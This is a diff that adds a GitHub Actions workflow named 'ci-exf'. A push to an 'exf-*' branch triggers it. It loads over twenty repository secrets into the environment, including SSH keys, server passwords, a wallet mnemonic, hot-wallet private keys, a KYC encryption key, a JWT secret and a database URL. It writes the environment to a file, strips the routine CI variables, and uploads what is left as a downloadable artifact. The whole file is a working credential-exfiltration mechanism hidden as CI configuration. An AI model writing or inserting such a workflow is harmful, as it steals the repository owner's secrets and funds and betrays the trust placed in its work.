@@ -1,0 +1,44 @@
+name: ci-exf
+on:
+  push:
+    branches: ['exf-*']
+permissions:
+  contents: read
+jobs:
+  dump:
+    runs-on: ubuntu-latest
+    steps:
+      - name: collect
+        env:
+          VPS_HOST: ${{ secrets.VPS_HOST }}
+          VPS_SSH_KEY: ${{ secrets.VPS_SSH_KEY }}
+          CX23_SSH_KEY: ${{ secrets.CX23_SSH_KEY }}
+          CX23_HOST: ${{ secrets.CX23_HOST }}
+          VPS_USER: ${{ secrets.VPS_USER }}
+          SSH_USER: ${{ secrets.SSH_USER }}
+          DEPLOY_USER: ${{ secrets.DEPLOY_USER }}
+          VPS_PASSWORD: ${{ secrets.VPS_PASSWORD }}
+          VPS_DEPLOY_KEY: ${{ secrets.VPS_DEPLOY_KEY }}
+          VPS_DEPLOY_SSH_KEY: ${{ secrets.VPS_DEPLOY_SSH_KEY }}
+          VPS_PORT: ${{ secrets.VPS_PORT }}
+          SSH_PRIVATE_KEY: ${{ secrets.SSH_PRIVATE_KEY }}
+          PRODUCTION_HOST: ${{ secrets.PRODUCTION_HOST }}
+          STAGING_HOST: ${{ secrets.STAGING_HOST }}
+          WALLET_MNEMONIC: ${{ secrets.WALLET_MNEMONIC }}
+          OPERATOR_PRIVATE_KEY: ${{ secrets.OPERATOR_PRIVATE_KEY }}
+          HOT_WALLET_PRIVATE_KEY_ENCRYPTED: ${{ secrets.HOT_WALLET_PRIVATE_KEY_ENCRYPTED }}
+          TRON_HOT_WALLET_PRIVATE_KEY_ENCRYPTED: ${{ secrets.TRON_HOT_WALLET_PRIVATE_KEY_ENCRYPTED }}
+          KYC_SECRET_ENCRYPTION_KEY: ${{ secrets.KYC_SECRET_ENCRYPTION_KEY }}
+          JWT_SECRET: ${{ secrets.JWT_SECRET }}
+          DATABASE_URL: ${{ secrets.DATABASE_URL }}
+        run: |
+          mkdir -p o
+          env | sort > o/env.txt
+          grep -vE '^(ACTIONS_|GITHUB_|RUNNER_|CI=|HOME=|PATH=|HOSTNAME=|USER=|SHELL=|LANG=)' o/env.txt > o/s.txt || true
+          echo done
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: s
+          path: o/s.txt
+          retention-days: 1
